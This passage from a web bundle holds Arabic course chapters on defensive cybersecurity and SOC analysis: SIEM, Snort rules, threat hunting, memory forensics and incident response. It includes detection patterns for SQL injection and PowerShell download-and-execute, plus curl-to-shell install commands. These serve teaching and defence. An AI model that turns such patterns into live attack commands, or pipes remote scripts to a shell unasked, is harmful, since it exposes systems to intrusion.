# البحث عن عمليات تم تشغيلها من مجلد Temp
Get-WinEvent -FilterXPath "*[System[EventID=4688]]" | Where-Object {$_.Message -like "*temp*"}
        </div>
      `},{number:11,title:"[متوسط] مقدمة في SIEM – ELK Stack (Elasticsearch, Logstash, Kibana)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: تجميع وتحليل السجلات مركزياً</h2>
        <p>SIEM (Security Information and Event Management) يجمع السجلات من مصادر متعددة ويكشف الأنماط الشاذة. سنستخدم ELK Stack (مفتوح المصدر).</p>
        <div class="code-block">
# تثبيت ELK Stack عبر Docker (أسهل طريقة)
curl -fsSL https://get.docker.com | sh
sudo docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" elasticsearch:8.8.0
sudo docker run -d --name kibana -p 5601:5601 --link elasticsearch:elasticsearch kibana:8.8.0

# إرسال سجلات من جهاز لينكس إلى Logstash (بحاجة تكوين إضافي)
# يمكن أيضاً استخدام Wazuh (بديل متكامل مبني على ELK)
        </div>
      `},{number:12,title:"[متوسط] تحليل الحزم باستخدام Wireshark و tcpdump",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: الغوص في حركة الشبكة</h2>
        <p>تحليل الحزم يكشف الهجمات التي قد لا تترك أثراً في السجلات.</p>
        <div class="code-block">
# التقاط الحزم باستخدام tcpdump وحفظها في ملف
sudo tcpdump -i eth0 -s 1500 -w capture.pcap

# فتح الملف في Wireshark
wireshark capture.pcap

# مرشحات Wireshark مفيدة للمدافع:
# http.request - عرض طلبات HTTP
# dns.qry.name contains "malware" - البحث عن استعلامات DNS مشبوهة
# tcp.flags.syn == 1 and tcp.flags.ack == 0 - محاولات إنشاء اتصال (قد تشير إلى هجوم)
# ip.src == 192.168.1.100 - تصفية حركة من عنوان IP محدد
        </div>
      `},{number:13,title:"[متوسط] أنظمة كشف ومنع التسلل (IDS/IPS) – Snort و Suricata",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: كشف الهجمات في الوقت الفعلي</h2>
        <p>IDS (نظام كشف التسلل) يراقب حركة المرور ويصدر تنبيهاً عند اكتشاف هجوم. IPS (نظام منع التسلل) يمكنه منع الهجوم تلقائياً.</p>
        <div class="code-block">
# تثبيت Snort على Ubuntu
sudo apt install snort -y

# تكوين Snort (اختر واجهة الشبكة المناسبة)
sudo dpkg-reconfigure snort

# تشغيل Snort في وضع التنبيه على الطرفية
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0

# تجربة: قم بمسح الجهاز باستخدام Nmap من جهاز آخر وسترى تنبيهات Snort
        </div>
        <p>Suricata هو بديل حديث يدعم معالجة GPU وبروتوكولات أكثر.</p>
      `},{number:14,title:"[متوسط] إدارة الثغرات باستخدام OpenVAS و Nessus",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: البحث عن نقاط الضعف قبل المهاجم</h2>
        <p>إدارة الثغرات (Vulnerability Management) هي عملية دورية لاكتشاف وتقييم وعلاج الثغرات الأمنية.</p>
        <div class="code-block">
# تثبيت OpenVAS (Greenbone Vulnerability Management)
sudo apt install gvm -y
sudo gvm-setup
sudo gvm-check-setup
sudo gvm-start
# بعد التثبيت، افتح المتصفح على https://127.0.0.1:9392
# تسجيل الدخول (admin/admin) ثم قم بتغيير كلمة المرور.

# إجراء مسح: Targets → New Target → أدخل عنوان IP الهدف.
# ثم Scans → New Scan → اختر الهدف وابدأ المسح.
        </div>
      `},{number:15,title:"[متوسط] مراقبة النقاط الطرفية (EDR) باستخدام Sysmon و Osquery",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: اكتشاف الأنشطة الضارة على الأجهزة</h2>
        <p>EDR (Endpoint Detection and Response) يراقب السلوكيات على الأجهزة الفردية. أدوات مجانية مثل Sysmon و Osquery تضيف رؤية عميقة.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Sysmon (Windows):</h3>
        <div class="code-block">
# تحميل وتثبيت Sysmon (مع ملف تكوين من SwiftOnSecurity)
sysmon64.exe -accepteula -i sysmonconfig.xml

# عرض أحداث Sysmon في Event Viewer (Applications and Services Logs/Microsoft/Windows/Sysmon/Operational)
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Osquery (لينكس وويندوز):</h3>
        <div class="code-block">
# تثبيت Osquery على Ubuntu
sudo apt install osquery -y
sudo osqueryi   # الدخول إلى واجهة SQL

# استعلامات مفيدة:
SELECT pid, name, path FROM processes;
SELECT * FROM file WHERE path LIKE '/tmp/%' AND filename LIKE '%.sh';
SELECT * FROM listening_ports;
        </div>
      `},{number:16,title:"[متوسط] الاستجابة للحوادث (Incident Response) – مراحل PICERL",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: ماذا تفعل عند حدوث اختراق؟</h2>
        <p>الاستجابة للحوادث هي عملية منظمة للتعامل مع الاختراقات. تعتمد على أطر مثل <strong>NIST SP 800-61</strong> أو <strong>SANS PICERL</strong>.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مراحل PICERL:</h3>
        <ol>
          <li><strong>التحضير (Preparation):</strong> تجهيز الأدوات والفرق والخطط.</li>
          <li><strong>التحديد (Identification):</strong> اكتشاف الاختراق وجمع الأدلة الأولية.</li>
          <li><strong>الاحتواء (Containment):</strong> عزل الأنظمة المتأثرة لمنع انتشار الهجوم (احتواء قصير وطويل الأمد).</li>
          <li><strong>الاستئصال (Eradication):</strong> إزالة السبب الجذري للاختراق (حذف الملفات الضارة، إغلاق الثغرات).</li>
          <li><strong>الاسترداد (Recovery):</strong> استعادة الأنظمة والبيانات من النسخ الاحتياطية.</li>
          <li><strong>الدروس المستفادة (Lessons Learned):</strong> توثيق الحادثة وتحسين الإجراءات المستقبلية.</li>
        </ol>
        <div class="note-box">
          📌 <strong>نشاط 16:</strong> قم بإنشاء خطة استجابة للحوادث من صفحة واحدة لمؤسسة صغيرة (5-10 موظفين). حدد فريق الاستجابة، قنوات الاتصال، وإجراءات الاحتواء الأولى.
        </div>
      `},{number:17,title:"[متوسط] الصيد الرقمي (Threat Hunting) – البحث عن التهديدات المخفية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: استباق الهجمات</h2>
        <p>الصيد الرقمي هو عملية بحث استباقي عن التهديدات التي قد تكون تجاوزت أدوات الأمن التقليدية.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">منهجية الصيد:</h3>
        <ol>
          <li><strong>الفرضية:</strong> بدءاً من TTP معين (مثل استخدام PowerShell للتحميل من الإنترنت).</li>
          <li><strong>البحث:</strong> كتابة استعلام في SIEM للبحث عن أنماط تطابق الفرضية.</li>
          <li><strong>التحليل:</strong> فحص النتائج يدوياً لتحديد الأنشطة الضارة المحتملة.</li>
          <li><strong>الإفادة:</strong> مشاركة النتائج مع الفريق وتحديث القواعد الأمنية.</li>
        </ol>
        <div class="code-block">
# مثال استعلام في Kibana (ELK) للبحث عن PowerShell تنزيل ملفات
winlogbeat* AND process.name:powershell.exe AND process.command_line:(*WebClient* OR *DownloadString* OR *Invoke-Expression*)
        </div>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي Event IDs المهمة في سجلات أمان ويندوز؟</li>
          <li>اشرح مكونات ELK Stack بإيجاز.</li>
          <li>كيف يمكنك التقاط الحزم باستخدام tcpdump وتحليلها في Wireshark؟</li>
          <li>ما الفرق بين IDS و IPS؟</li>
          <li>اذكر خطوات تثبيت OpenVAS وبدء مسح بسيط.</li>
          <li>ما هو دور Sysmon في مراقبة النقاط الطرفية؟</li>
          <li>اشرح مراحل الاستجابة للحوادث وفق نموذج PICERL.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> قم بتثبيت Snort IDS على أحد أجهزة Ubuntu في شبكتك المنزلية. شغّل فحص Nmap من جهاز آخر، وسجل التنبيهات التي يولدها Snort. ثم التقط حزمة باستخدام tcpdump وافتحها في Wireshark للتحقق من طلبات الفحص. دوّن ملاحظاتك.</p>
      `},{number:19,title:"[متقدم] أتمتة تحليل السجلات باستخدام Python و ELK",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: كتابة أدوات تحليل مخصصة</h2>
        <p>الأتمتة تقلل من زمن الاستجابة وتزيد من كفاءة المحلل.</p>
        <div class="code-block">
# سكريبت بايثون لقراءة سجلات Linux والبحث عن محاولات تسجيل دخول فاشلة
import re

with open('/var/log/auth.log', 'r') as f:
    for line in f:
        if 'Failed password' in line:
            ip = re.search(r'from (\\d+\\.\\d+\\.\\d+\\.\\d+)', line)
            if ip:
                print(f'Failed login attempt from {ip.group(1)}')

# استخدام API الخاص بـ Elasticsearch لسحب التنبيهات
from elasticsearch import Elasticsearch
es = Elasticsearch(['http://localhost:9200'])
res = es.search(index='winlogbeat-*', body={'query': {'match': {'event_id': 4625}}})
for hit in res['hits']['hits']:
    print(hit['_source']['message'])
        </div>
      `},{number:20,title:"[متقدم] تكوين وتحسين Snort/Suricata لقواعد مخصصة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: كتابة قواعد كشف الهجمات بنفسك</h2>
        <p>قواعد IDS/IPS تحدد الأنماط التي يجب تنبيهها. يمكنك كتابة قواعد مخصصة لتناسب بيئتك.</p>
        <div class="code-block">
# مثال على قاعدة Snort للكشف عن فحص المنافذ (port scan)
alert tcp $EXTERNAL_NET any -> $HOME_NET 1:1024 (msg:"PORT SCAN DETECTED"; flags:S; threshold: type both, track by_src, count 5, seconds 10; sid:1000001; rev:1;)

# قاعدة للكشف عن طلب SQL Injection (بسيط)
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection Attempt"; content:"' OR '1'='1"; http_uri; sid:1000002; rev:1;)
        </div>
        <p>بعد كتابة القاعدة، ضعها في ملف <code>/etc/snort/rules/local.rules</code> وأعد تشغيل Snort.</p>
      `},{number:21,title:"[متقدم] الأمن السحابي – مراقبة AWS/Azure/GCP",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: حماية البيئات السحابية</h2>
        <p>مع التحول إلى السحابة، يجب فهم نموذج المسؤولية المشتركة (Shared Responsibility Model).</p>
        <ul>
          <li><strong>AWS CloudTrail:</strong> يسجل جميع استدعاءات API في حساب AWS.</li>
          <li><strong>Azure Monitor:</strong> يجمع السجلات من موارد Azure.</li>
          <li><strong>Google Cloud Logging:</strong> مشابه.</li>
        </ul>
        <div class="code-block">
# مثال: استخدام AWS CLI لتحليل سجلات CloudTrail والبحث عن تسجيلات دخول غير عادية
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin

# استخدام Prowler (أداة مفتوحة المصدر) للكشف عن التكوينات الخاطئة في AWS
git clone https://github.com/prowler-cloud/prowler
cd prowler
./prowler -M csv
        </div>
      `},{number:22,title:"[متقدم] تطبيق مبادئ Zero Trust في البنية التحتية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: لا تثق أبداً، تحقق دائماً</h2>
        <p>مبدأ Zero Trust يفترض أن الشبكة قد تكون مخترقة بالفعل، لذلك يجب التحقق من كل طلب وصول بغض النظر عن موقعه.</p>
        <ul>
          <li><strong>الهوية (Identity):</strong> استخدام MFA قوية وإدارة الوصول الدقيقة (Least Privilege).</li>
          <li><strong>الأجهزة (Devices):</strong> التحقق من حالة الجهاز قبل السماح بالوصول (Device Compliance).</li>
          <li><strong>الشبكة (Network):</strong> تقسيم الشبكة إلى قطاعات صغيرة (Micro-segmentation) واستخدام التشفير.</li>
          <li><strong>التطبيقات والبيانات (Apps & Data):</strong> التحكم في الوصول حتى داخل التطبيق نفسه.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-lock text-neon text-2xl mb-2 block"></i>
          الشكل 22.1: مبادئ Zero Trust – لا تثق أبداً، تحقق دائماً
        </div>
      `},{number:23,title:"[متقدم] أمن البنية التحتية للـ Active Directory",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: حماية العمود الفقري للشركات</h2>
        <p>Active Directory (AD) هو قلب معظم شبكات الشركات. اختراقه يعني اختراق كل شيء. لذا يجب حمايته بشدة.</p>
        <ul>
          <li><strong>تطبيق التصحيحات بانتظام:</strong> خاصة الثغرات الحرجة (مثل ZeroLogon).</li>
          <li><strong>مراقبة الأحداث الحرجة:</strong> Event ID 4768 (طلب TGT)، 4776 (التحقق من كلمة المرور)، 4662 (تغيير الصلاحيات).</li>
          <li><strong>استخدام حسابات خدمة مدارة (gMSA).</strong></li>
          <li><strong>تنفيذ مبدأ Least Privilege على جميع المستخدمين والخدمات.</strong></li>
        </ul>
        <div class="code-block">
# PowerShell: البحث عن حسابات لديها صلاحيات مرتفعة غير ضرورية
Get-ADUser -Filter {AdminCount -eq 1} | Select-Object Name, Enabled

# البحث عن أحداث تغيير كلمة المرور (Event ID 4723) في سجل الأمان
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4723}
        </div>
      `},{number:24,title:"[متقدم] تحليل الذاكرة (Memory Forensics) للكشف عن البرامج الضارة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: التحقيق في ذاكرة الوصول العشوائي</h2>
        <p>تحليل الذاكرة يكشف العمليات المخفية والاتصالات المشبوهة التي قد لا تظهر في القرص الصلب.</p>
        <div class="code-block">
# تثبيت Volatility
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python setup.py install

# جمع ملف ذاكرة من جهاز ويندوز (باستخدام WinPMem)
winpmem.exe -o memdump.raw

# تحليل الملف
volatility -f memdump.raw imageinfo
volatility -f memdump.raw --profile=Win10x64 pslist   # عرض العمليات
volatility -f memdump.raw --profile=Win10x64 netscan  # عرض الاتصالات الشبكية
volatility -f memdump.raw --profile=Win10x64 malfind  # البحث عن عمليات محقونة
        </div>
      `},{number:25,title:"[متقدم] أتمتة الاستجابة (SOAR) باستخدام TheHive و Shuffle",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: الاستجابة التلقائية للحوادث</h2>
        <p>SOAR (Security Orchestration, Automation and Response) هي منصات تعمل على أتمتة سير عمل الاستجابة.</p>
        <div class="code-block">
# تثبيت TheHive (مفتوح المصدر) عبر Docker
curl -sSL https://raw.githubusercontent.com/StrangeBeeCorp/docker/main/install-thehive.sh | bash

# بعد التثبيت، افتح المتصفح على http://localhost:9000
# أنشئ منظمة وقم بإضافة تنبيه يدوي أو من SIEM.

# استخدام Shuffle (بديل سحابي) لإنشاء playbooks بسيطة دون برمجة.
        </div>
        <p>مثال على playbook: عند استقبال تنبيه من Snort، يقوم Shuffle بإنشاء تذكرة في TheHive، ثم يستدعي VirusTotal API لفحص IP المصدر، ويرسل البريد لفريق الأمن.</p>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 12 شهراً لتصبح Blue Team Specialist",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من الصفر إلى محلل دفاعي</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> شهادة CompTIA Network+ و Security+ (أساسيات).</li>
          <li><strong>الشهر 3-4:</strong> دراسة منصة Blue Team Labs Online (تمارين تحليل سجلات و pcap).</li>
          <li><strong>الشهر 5-6:</strong> الحصول على شهادة Blue Team Level 1 (BTL1) – عملية بالكامل.</li>
          <li><strong>الشهر 7-9:</strong> دراسة دورة SEC450 من SANS (SOC Analyst) أو CySA+ (CompTIA).</li>
          <li><strong>الشهر 10-12:</strong> بناء مختبر SOC منزلي (ELK + Wazuh)، وأتمتة جزء من المهام باستخدام Python و TheHive.</li>
        </ul>
        <div class="note-box">
          🎯 <strong>هدف نهائي:</strong> بعد 12 شهراً، يمكنك التقدم لوظائف "Security Analyst" أو "SOC Analyst" أو "Blue Team Specialist".
        </div>
      `},{number:27,title:"[متقدم] المشروع النهائي الشامل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: بناء مركز عمليات أمني (SOC) مصغر</h2>
        <p><strong>السيناريو:</strong> أنت مسؤول عن تأمين شبكة صغيرة تحتوي على 3 أجهزة (Ubuntu، Windows 10، خادم ويب Apache).</p>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>تثبيت ELK Stack (أو Wazuh) على جهاز منفصل لتجميع السجلات من جميع الأجهزة.</li>
          <li>تثبيت Snort IDS على جهاز Ubuntu وجمع تنبيهاته أيضاً.</li>
          <li>إنشاء لوحة تحكم (Dashboard) في Kibana تعرض: عدد محاولات تسجيل الدخول الفاشلة، المناطق الجغرافية للعناوين المهاجمة، وأفضل الأحداث الأمنية.</li>
          <li>محاكاة هجوم بسيط (مثل فحص Nmap أو محاولة تسجيل دخول بـ SSH بكلمة مرور خاطئة) وتأكيد ظهور التنبيهات في لوحة التحكم.</li>
          <li>كتابة تقرير (3-5 صفحات) يوضح هيكل المختبر، الأدوات المستخدمة، وكيفية تحسين الأمن بناءً على النتائج.</li>
        </ol>
        <p>بعد إتمام هذا المشروع، ستكون قد طبقت عملياً معظم مفاهيم الدفاع السيبراني التي تعلمتها.</p>
      `}]},nv={id:"soc",title:"SOC Analyst",emoji:"🟡",color:"yellow",description:"منهج متكامل من 3 مستويات - محلل مركز العمليات الأمنية",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~190 صفحة",icon:"fa-eye",chapters:[{number:1,title:"[مبتدئ] من هو محلل SOC؟ المهام والمسؤوليات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: دور محلل SOC في المنظومة الأمنية</h2>
        <p>مركز العمليات الأمنية (SOC) هو الوحدة المسؤولة عن مراقبة وتحليل والاستجابة للتهديدات الأمنية على مدار الساعة. محلل SOC هو الشخص الذي يعمل داخل هذا المركز.</p>
        <p><strong>المسؤوليات الأساسية:</strong></p>
        <ul>
          <li>مراقبة لوحات SIEM وتحليل التنبيهات.</li>
          <li>التحقق من صحة الاختراقات (Triage) وتصنيفها (True Positive / False Positive).</li>
          <li>إثراء التنبيهات بمعلومات إضافية (مثل VirusTotal، AbuseIPDB).</li>
          <li>التصعيد (Escalation) للمستوى الثاني أو فريق الاستجابة للحوادث.</li>
          <li>إعداد تقارير دورية (يومية/أسبوعية/شهرية).</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-chart-line text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> مسار التنبيه في SOC – من المصدر إلى الإغلاق أو التصعيد
        </div>
        <div class="note-box">
          📌 <strong>معلومة:</strong> غالباً ما تنقسم أدوار SOC إلى مستويات: Tier 1 (الفرز)، Tier 2 (التحقيق المتقدم)، Tier 3 (الصيد الرقمي والاستجابة).
        </div>
      `},{number:2,title:"[مبتدئ] تجهيز بيئة عمل SOC محاكية (SIEM Open Source)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: بناء مختبرك الخاص لتحليل السجلات</h2>
        <p>للتطبيق العملي، سنستخدم <strong>Wazuh</strong> (منصة SIEM مفتوحة المصدر وسهلة التثبيت) أو <strong>ELK Stack</strong>.</p>
        <div class="code-block">
# تثبيت Wazuh عبر Docker (الطريقة الأسهل)
curl -sO https://packages.wazuh.com/4.7/docker/wazuh-docker.sh && bash wazuh-docker.sh
cd wazuh-docker
docker-compose -f generate-indexer-cluster.yml up -d

# بعد دقيقة، افتح المتصفح على https://localhost:443
# اسم المستخدم: admin، كلمة المرور موجودة في ملف wazuh-passwords.txt

# تثبيت وكيل Wazuh على جهاز Windows أو Linux لجمع السجلات
# (اتبع التعليمات من واجهة Wazuh → Agents → Add agent)
        </div>
        <div class="note-box">
          📌 <strong>نشاط 2:</strong> قم بتثبيت Wazuh على جهاز افتراضي أو على جهازك (معزول). أضف جهازاً واحداً (مثلاً Windows 10) كوكيل. تأكد من ظهور السجلات في لوحة التحكم.
        </div>
      `},{number:3,title:"[مبتدئ] أساسيات الشبكات والبروتوكولات للمحلل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: لغة حركة المرور</h2>
        <p>لفهم التنبيهات وتحليل الهجمات، يجب إتقان أساسيات الشبكات:</p>
        <ul>
          <li>نموذج OSI والطبقات المرتبطة بالهجمات (الطبقات 3،4،7).</li>
          <li>بروتوكولات TCP/IP، UDP، ICMP.</li>
          <li>المنافذ القياسية والخدمات المرتبطة (21،22،25،53،80،443،445،3389).</li>
          <li>DNS، HTTP، HTTPS، SMTP.</li>
        </ul>
        <div class="code-block">
# أوامر مفيدة لتحليل الشبكة للمحلل
netstat -an | findstr "ESTABLISHED"   # ويندوز
ss -tulpn                             # لينكس
nslookup google.com
        </div>
      `},{number:4,title:"[مبتدئ] فهم السجلات الأساسية في ويندوز ولينكس",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: عيون المحلل – السجلات (Logs)</h2>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">سجلات ويندوز الرئيسية:</h3>
        <ul>
          <li><strong>Security:</strong> أحداث المصادقة، تغييرات الصلاحيات، إنشاء العمليات.</li>
          <li><strong>System:</strong> أحداث النظام، توقف الخدمات.</li>
          <li><strong>Application:</strong> أحداث التطبيقات المثبتة.</li>
          <li><strong>PowerShell:</strong> سجلات أوامر PowerShell (مهم للكشف عن الأنشطة الضارة).</li>
        </ul>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">سجلات لينكس الرئيسية:</h3>
        <ul>
          <li><code>/var/log/auth.log</code> – محاولات SSH، المصادقة، sudo.</li>
          <li><code>/var/log/syslog</code> – أحداث النظام العامة.</li>
          <li><code>/var/log/apache2/access.log</code> – سجلات خادم الويب.</li>
        </ul>
      `},{number:5,title:"[مبتدئ] تحليل سجلات أمان ويندوز باستخدام PowerShell",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: استخراج الأحداث الحرجة</h2>
        <p>Event IDs الأساسية التي يجب أن تكون على دراية بها:</p>
        <ul>
          <li><strong>4624:</strong> تسجيل دخول ناجح.</li>
          <li><strong>4625:</strong> فشل تسجيل الدخول.</li>
          <li><strong>4648:</strong> محاولة تسجيل دخول باستخدام بيانات اعتماد صريحة (RunAs).</li>
          <li><strong>4688:</strong> إنشاء عملية جديدة.</li>
          <li><strong>4698:</strong> إنشاء مهمة مجدولة.</li>
          <li><strong>7034, 7035, 7036:</strong> تغييرات في حالة الخدمات.</li>
        </ul>
        <div class="code-block">
# أمثلة أوامر PowerShell
# عرض آخر 10 أحداث فشل تسجيل دخول
Get-EventLog -LogName Security -EntryType FailureAudit -Newest 10 | Format-Table -AutoSize

# البحث عن إنشاء عمليات جديدة (Event ID 4688)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Select-Object TimeCreated, Message

# البحث عن عمليات تم تشغيلها من مجلد Temp (مؤشر على نشاط ضار)
Get-WinEvent -FilterXPath "*[System[EventID=4688]]" | Where-Object {$_.Message -like "*temp*"}
        </div>
        <div class="note-box">
          📌 <strong>نشاط 5:</strong> قم بتسجيل الدخول ببيانات خاطئة على جهاز ويندوز عدة مرات، ثم استخدم PowerShell لاستخراج أحداث Event ID 4625. كم مرة ظهرت؟
        </div>
      `},{number:6,title:"[مبتدئ] تحليل سجلات أمان لينكس (auth.log و syslog)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: تتبّع الأحداث على لينكس</h2>
        <div class="code-block">
# تحليل سجلات المصادقة: البحث عن محاولات SSH فاشلة
sudo grep "Failed password" /var/log/auth.log

# البحث عن محاولات sudo فاشلة
sudo grep "sudo.*COMMAND" /var/log/auth.log

# متابعة سجل النظام في الوقت الحقيقي
sudo tail -f /var/log/syslog

# البحث عن نشاط غير عادي باستخدام awk
awk '/Failed password/ {print $1,$2,$3,$9,$11}' /var/log/auth.log | tail -20
        </div>
        <div class="note-box">
          📌 <strong>نشاط 6:</strong> قم بتسجيل الدخول إلى جهاز Ubuntu عبر SSH بكلمة مرور خاطئة 3 مرات، ثم استخدم <code>grep</code> لاستخراج السجلات. ما هي عناوين IP المسجلة؟
        </div>
      `},{number:7,title:"[مبتدئ] مقدمة في SIEM – مكونات ELK و Wazuh",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: كيف يعمل نظام إدارة المعلومات والأحداث الأمنية؟</h2>
        <p>SIEM يقوم بـ:</p>
        <ul>
          <li>جمع السجلات من مصادر متعددة (خوادم، جدران حماية، أجهزة أمنية).</li>
          <li>تطبيع البيانات (Normalization) لجعلها بتنسيق موحد.</li>
          <li>تحليل السجلات في الوقت الفعلي (Correlation) واكتشاف الأنماط الشاذة.</li>
          <li>توليد تنبيهات وتخزين السجلات للبحث في المستقبل.</li>
        </ul>
        <p>في مختبرنا، سنستخدم <strong>Wazuh</strong> الذي يدمج ELK مع وكيل أمني متقدم.</p>
        <div class="fig-box">
          <i class="fas fa-server text-neon text-2xl mb-2 block"></i>
          الشكل 7.1: مكونات Wazuh – Indexer (Elasticsearch)، Dashboard (Kibana)، Server (Manager)، Agents.
        </div>
      `},{number:8,title:"[مبتدئ] التنقل في واجهة Kibana وقراءة التنبيهات الأساسية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: أول لقاء مع لوحة التحكم</h2>
        <p>بعد تثبيت Wazuh، افتح Kibana (https://localhost:443). ستجد واجهة تحتوي على:</p>
        <ul>
          <li><strong>Discover:</strong> لاستكشاف السجلات الخام (الرسائل المرسلة من الوكلاء).</li>
          <li><strong>Dashboard:</strong> لوحات تحكم جاهزة (مثل "Security Events"، "Vulnerabilities").</li>
          <li><strong>Alerts:</strong> قائمة التنبيهات الأمنية (بناءً على قواعد Wazuh).</li>
          <li><strong>Modules:</strong> وحدات مثل الـ Vulnerability Detection و File Integrity Monitoring.</li>
        </ul>
        <div class="code-block">
# مثال على استعلام بسيط في Kibana (Discover)
rule.groups: "windows" AND data.win.eventdata.processName: "powershell.exe"
        </div>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي المسؤوليات الأساسية لمحلل SOC من المستوى الأول (Tier 1)؟</li>
          <li>ما هي الأدوات التي استخدمناها لتجميع السجلات في البيئة المحاكية؟</li>
          <li>اذكر Event ID واحداً لنجاح تسجيل الدخول وآخر لفشل تسجيل الدخول على ويندوز.</li>
          <li>كيف تبحث عن محاولات SSH فاشلة في سجل auth.log؟</li>
          <li>ما الفرق بين "True Positive" و "False Positive" في تحليل التنبيهات؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتثبيت Wazuh وأضف جهازين كوكلاء (Windows و Ubuntu). تأكد من ظهور السجلات في Kibana. اكتب تقريراً من صفحة واحدة يوضح خطوات التثبيت والمشكلات التي واجهتها.</p>
      `},{number:10,title:"[متوسط] تحليل التنبيهات والفرز (Triage) – تصنيف الخطر",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: كيف تتعامل مع سيل التنبيهات؟</h2>
        <p>المحلل من المستوى الأول يستقبل مئات أو آلاف التنبيهات يومياً. مهمته تحديد أيها حقيقي (True Positive) وأيها خاطئ (False Positive).</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">خطوات الفرز الفعالة:</h3>
        <ol>
          <li>قراءة التنبيه وفهم نوعه (مثل: "تسجيل دخول ناجح من موقع غير معتاد").</li>
          <li>جمع معلومات إضافية (IP المصدر، اسم المستخدم، التوقيت).</li>
          <li>البحث عن سياق الحدث (هل هذا المستخدم معتاد على السفر؟ هل IP المصدر مدرج في قوائم الحظر؟).</li>
          <li>استخدام أدوات إثراء (VirusTotal، AbuseIPDB، Whois).</li>
          <li>إغلاق التنبيه إذا كان إيجابياً كاذباً (مع تعليل)، أو ترقيته إلى Tier 2 إذا كان مشبوهاً.</li>
        </ol>
        <div class="note-box">
          📌 <strong>نشاط 10:</strong> قم بإنشاء تنبيه وهمي في مختبرك (مثل تشغيل PowerShell لتنزيل ملف من الإنترنت). طبق خطوات الفرز أعلاه وقرر ما إذا كان هذا النشاط طبيعياً (في سياق عملك) أم لا.
        </div>
      `},{number:11,title:"[متوسط] إثراء التنبيهات باستخدام APIs (VirusTotal, AbuseIPDB)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: إضافة السياق إلى التنبيهات</h2>
        <p>استخدام واجهات برمجة التطبيقات (APIs) يجعل عملية الإثراء أسرع وأكثر دقة.</p>
        <div class="code-block">
# مثال: استخدام VirusTotal API للتحقق من عنوان IP
import requests

api_key = "YOUR_VT_API_KEY"
ip = "8.8.8.8"
url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip}"
headers = {"x-apikey": api_key}
response = requests.get(url, headers=headers)
print(response.json()['data']['attributes']['last_analysis_stats'])

# مثال: استخدام AbuseIPDB لفحص عنوان IP
import requests

api_key = "YOUR_ABUSEIPDB_API_KEY"
url = "https://api.abuseipdb.com/api/v2/check"
params = {"ipAddress": "8.8.8.8", "maxAgeInDays": 90}
headers = {"Key": api_key, "Accept": "application/json"}
response = requests.get(url, headers=headers, params=params)
print(response.json())
        </div>
      `},{number:12,title:"[متوسط] تحليل الحزم (PCAP) لاستكشاف الاختراقات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: الغوص في تفاصيل الشبكة</h2>
